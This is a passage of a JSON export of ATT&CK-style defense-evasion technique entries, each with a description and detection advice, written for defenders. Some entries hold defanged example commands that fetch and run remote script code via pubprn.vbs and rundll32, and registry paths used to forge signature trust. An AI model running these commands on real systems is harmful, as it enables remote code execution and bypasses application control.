11:56:01","pivot":{"technique_id":709,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":712,"name":"T1055.008 - Ptrace System Calls","sort_id":0,"external_id":"T1055.008","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. <\/p>\n<p>Ptrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.(Citation: PTRACE man) Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: <code>malloc<\/code>) then invoking that memory with <code>PTRACE_SETREGS<\/code> to set the register containing the next instruction to execute. Ptrace system call injection can also be done with <code>PTRACE_POKETEXT<\/code>\/<code>PTRACE_POKEDATA<\/code>, which copy data to a specific address in the target processes\u2019 memory (ex: the current address of the next instruction). (Citation: PTRACE man)(Citation: Medium Ptrace JUL 2018) <\/p>\n<p>Ptrace system call injection may not be possible targeting processes with high-privileges, and on some system those that are non-child processes.(Citation: BH Linux Inject) <\/p>\n<p>Running code in the context of another process may allow access to the process's memory, system\/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits) \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":712,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":713,"name":"T1216.001 - PubPrn","sort_id":0,"external_id":"T1216.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may use the trusted PubPrn script to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application control solutions that do not account for use of these scripts.<\/p>\n<p><code>PubPrn.vbs<\/code> is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script is signed by Microsoft and can be used to proxy execution from a remote site.(Citation: Enigma0x3 PubPrn Bypass) An example command is <code>cscript C[:]\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn[.]vbs 127.0.0.1 script:http[:]\/\/192.168.1.100\/hi.png<\/code>.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":713,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":720,"name":"T1218.009 - Regsvcs\/Regasm","sort_id":0,"external_id":"T1218.009","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET <a href=\"https:\/\/attack.mitre.org\/techniques\/T1559\/001\">Component Object Model<\/a> (COM) assemblies. Both are digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)<\/p>\n<p>Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]<\/code> or <code>[ComUnregisterFunction]<\/code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Use process monitoring to monitor the execution and arguments of Regsvcs.exe and Regasm.exe. Compare recent invocations of Regsvcs.exe and Regasm.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after Regsvcs.exe or Regasm.exe invocation may also be useful in determining the origin and purpose of the binary being executed.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":720,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":721,"name":"T1218.010 - Regsvr32","sort_id":0,"external_id":"T1218.010","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe is also a Microsoft signed binary. (Citation: Microsoft Regsvr32)<\/p>\n<p>Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a &quot;Squiblydoo&quot; attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)<\/p>\n<p>Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via <a href=\"https:\/\/attack.mitre.org\/techniques\/T1546\/015\">Component Object Model Hijacking<\/a>. (Citation: Carbon Black Squiblydoo Apr 2016)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded. (Citation: Carbon Black Squiblydoo Apr 2016)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":721,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":726,"name":"T1036.003 - Rename System Utilities","sort_id":0,"external_id":"T1036.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing. (Citation: LOLBAS Main Site) It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe<\/code>). (Citation: Endgame Masquerade Ball) An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths. (Citation: F-Secure CozyDuke)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"If file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and\/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Endgame Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":726,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":726,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":726,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":727,"name":"T1578.004 - Revert Cloud Instance","sort_id":0,"external_id":"T1578.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.<\/p>\n<p>Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and\/or ephemeral, with the ephemeral types often reset upon stop\/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Establish centralized logging of instance activity, which can be used to monitor and review system events even after reverting to a snapshot, rolling back changes, or changing persistence\/type of storage. Monitor specifically for events related to snapshots and rollbacks and VM configuration changes, that are occurring outside of normal activity. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.","platforms":[{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":727,"platform_id":6,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":727,"platform_id":7,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":727,"platform_id":8,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":728,"name":"T1036.002 - Right-to-Left Override","sort_id":0,"external_id":"T1036.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may use the right-to-left override (RTLO or RLO) character (U+202E) as a means of tricking a user into executing what they think is a benign file type but is actually executable code. RTLO is a non-printing character that causes the text that follows it to be displayed in reverse.(Citation: Infosecinstitute RTLO Technique) For example, a Windows screensaver executable named <code>March 25 \\u202Excod.scr<\/code> will display as <code>March 25 rcs.docx<\/code>. A JavaScript file named <code>photo_high_re\\u202Egnp.js<\/code> will be displayed as <code>photo_high_resj.png<\/code>.<\/p>\n<p>A common use of this technique is with <a href=\"https:\/\/attack.mitre.org\/techniques\/T1566\/001\">Spearphishing Attachment<\/a>\/<a href=\"https:\/\/attack.mitre.org\/techniques\/T1204\/002\">Malicious File<\/a> since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Detection methods should include looking for common formats of RTLO characters within filenames such as <code>\\u202E<\/code>, <code>[U+202E]<\/code>, and <code>%E2%80%AE<\/code>. Defenders should also check their analysis tools to ensure they do not interpret the RTLO character and instead print the true name of the file containing it.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":728,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":728,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":728,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":729,"name":"T1564.006 - Run Virtual Instance","sort_id":0,"external_id":"T1564.006","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.(Citation: SingHealth Breach Jan 2019)<\/p>\n<p>Adversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.(Citation: Sophos Ragnar May 2020)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Consider monitoring for files and processes associated with running a virtual instance, such as binary files associated with common virtualization technologies (ex: VirtualBox, VMware, QEMU, Hyper-V). Consider monitoring for process command-line arguments that may be atypical for benign use of virtualization software. Usage of virtualization binaries or command-line arguments associated with running a headless (in the background with no UI) virtual instance may be especially suspect. Network adapter information may also be helpful in detecting the use of virtual instances.\n\nIf virtualization software is installed by the adversary, the Registry may provide detection opportunities. Consider monitoring for [Windows Service](https:\/\/attack.mitre.org\/techniques\/T1543\/003), with respect to virtualization software. \n\nBenign usage of virtualization technology is common in enterprise environments, data and events should not be viewed in isolation, but as part of a chain of behavior.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":729,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":729,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":729,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":730,"name":"T1218.011 - Rundll32","sort_id":0,"external_id":"T1218.011","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. <a href=\"https:\/\/attack.mitre.org\/techniques\/T1129\">Shared Modules<\/a>), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads.<\/p>\n<p>Rundll32.exe can also be used to execute <a href=\"https:\/\/attack.mitre.org\/techniques\/T1218\/002\">Control Panel<\/a> Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL<\/code> and <code>Control_RunDLLAsUser<\/code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)<\/p>\n<p>Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:&quot;..\\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:https[:]\/\/www[.]example[.]com\/malicious.sct&quot;)&quot;<\/code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":730,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":732,"name":"T1134.005 - SID-History Injection","sort_id":0,"external_id":"T1134.005","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).<\/p>\n<p>With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users\/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and\/or access to otherwise inaccessible domains via lateral movement techniques such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1021\">Remote Services<\/a>, <a href=\"https:\/\/attack.mitre.org\/techniques\/T1077\">Windows Admin Shares<\/a>, or <a href=\"https:\/\/attack.mitre.org\/techniques\/T1028\">Windows Remote Management<\/a>.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Examine data in user\u2019s SID-History attributes using the PowerShell <code>Get-ADUser<\/code> cmdlet (Citation: Microsoft Get-ADUser), especially users who have SID-History values from the same domain. (Citation: AdSecurity SID History Sept 2015) Also monitor account management events on Domain Controllers for successful and failed changes to SID-History. (Citation: AdSecurity SID History Sept 2015) (Citation: Microsoft DsAddSidHistory)\n\nMonitor for Windows API calls to the <code>DsAddSidHistory<\/code> function. (Citation: Microsoft DsAddSidHistory)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":732,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":733,"name":"T1553.003 - SIP and Trust Provider Hijacking","sort_id":0,"external_id":"T1553.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)<\/p>\n<p>Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)<\/p>\n<p>Similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1116\">Code Signing<\/a>, adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)<\/p>\n<ul>\n<li>Modifying the <code>Dll<\/code> and <code>FuncName<\/code> Registry values in <code>HKLM\\SOFTWARE[\\WOW6432Node]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg{SIP_GUID}<\/code> that point to the dynamic link library (DLL) providing a SIP\u2019s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file\u2019s real signature, an adversary can apply an acceptable signature value to all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).<\/li>\n<li>Modifying the <code>Dll<\/code> and <code>FuncName<\/code> Registry values in <code>HKLM\\SOFTWARE[WOW6432Node]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData{SIP_GUID}<\/code> that point to the DLL providing a SIP\u2019s CryptSIPDllVerifyIndirectData function, which validates a file\u2019s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.<\/li>\n<li>Modifying the <code>DLL<\/code> and <code>Function<\/code> Registry values in <code>HKLM\\SOFTWARE[WOW6432Node]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy{trust provider GUID}<\/code> that point to the DLL providing a trust provider\u2019s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP\u2019s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).<\/li>\n<li><strong>Note:<\/strong> The above hijacks are also possible without modifying the Registry via <a href=\"https:\/\/attack.mitre.org\/techniques\/T1038\">DLL Search Order Hijacking<\/a>.<\/li>\n<\/ul>\n<p>Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Periodically baseline registered SIPs and trust providers (Registry entries and files on disk), specifically looking for new, modified, or non-Microsoft entries. (Citation: SpectorOps Subverting Trust Sept 2017)\n\nEnable CryptoAPI v2 (CAPI) event logging (Citation: Entrust Enable CAPI2 Aug 2017) to monitor and analyze error events related to failed trust validation (Event ID 81, though this event can be subverted by hijacked trust provider components) as well as any other provided information events (ex: successful validations). Code Integrity event logging may also provide valuable indicators of malicious SIP or trust provider loads, since protected processes that attempt to load a maliciously-crafted trust validation component will likely fail (Event ID 3033). (Citation: SpectorOps Subverting Trust Sept 2017)\n\nUtilize Sysmon detection rules and\/or enable the Registry (Global Object Access Auditing) (Citation: Microsoft Registry Auditing Aug 2016) setting in the Advanced Security Audit policy to apply a global system access control list (SACL) and event auditing on modifications to Registry values (sub)keys related to SIPs and trust providers: (Citation: Microsoft Audit Registry July 2012)\n\n* HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID\n* HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\n* HKLM\\SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\n* HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\Providers\\Trust\n\n**Note:** As part of this technique, adversaries may attempt to manually edit these Registry keys (ex: Regedit) or utilize the legitimate registration process using [Regsvr32](https:\/\/attack.mitre.org\/techniques\/T1117). (Citation: SpectorOps Subverting Trust Sept 2017)\n\nAnalyze Autoruns data for oddities and anomalies, specifically malicious files attempting persistent execution by hiding within auto-starting locations. Autoruns will hide entries signed by Microsoft or Windows by default, so ensure \u201cHide Microsoft Entries\u201d and \u201cHide Windows Entries\u201d are both deselected. (Citation: SpectorOps Subverting Trust Sept 2017)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":733,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":753,"name":"T1027.002 - Software Packing","sort_id":0,"external_id":"T1027.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) <\/p>\n<p>Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, (Citation: Wikipedia Exe Compression) but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.  <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Use file scanning to look for known software packers or artifacts of packing techniques. Packing is not a definitive indicator of malicious activity, because legitimate software may use packing techniques to reduce binary size or to protect proprietary code.","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":753,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":753,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":754,"name":"T1036.006 - Space after Filename","sort_id":0,"external_id":"T1036.006","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.<\/p>\n<p>For example, if there is a Mach-O executable file called <code>evil.bin<\/code>, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to <code>evil.txt<\/code>, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to <code>evil.txt <\/code> (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back).<\/p>\n<p>Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"It's not common for spaces to be at the end of filenames, so this is something that can easily be checked with file monitoring. From the user's perspective though, this is very hard to notice from within the Finder.app or on the command-line in Terminal.app. Processes executed from binaries containing non-standard extensions in the filename are suspicious.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":754,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":754,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":761,"name":"T1027.003 - Steganography","sort_id":0,"external_id":"T1027.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.<\/p>\n<p><a href=\"https:\/\/attack.mitre.org\/software\/S0038\">Duqu<\/a> was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.(Citation: Wikipedia Duqu) 